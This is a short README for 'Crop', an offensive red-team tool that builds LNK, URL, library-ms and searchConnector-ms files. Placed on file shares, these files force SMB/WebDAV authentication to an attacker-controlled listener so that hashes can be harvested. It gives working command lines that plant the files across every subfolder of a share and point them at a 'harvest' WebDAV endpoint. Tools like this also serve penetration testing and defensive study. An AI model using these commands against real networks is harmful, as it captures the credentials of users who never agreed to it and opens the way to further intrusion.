# Crop
Author: @domchell

This project is a submodule of Farmer.

Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks.

Usage:
```
LNK File:
crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
crop.exe \\fileserver\Common\ crop.lnk \\workstation@8888\harvest \\workstation@8888\harvest

Other formats:
Supported extensions: .url, .library-ms, .searchConnector-ms
crop.exe <output folder> <output filename> <WebDAV server> [options]
crop.exe \\fileserver\Common\ crop.url \\workstation@8888\harvest

Optional arguments:
--recurse : write the file to every sub folder of the specified path
--clean : remove the file from every sub folder of the specified path
```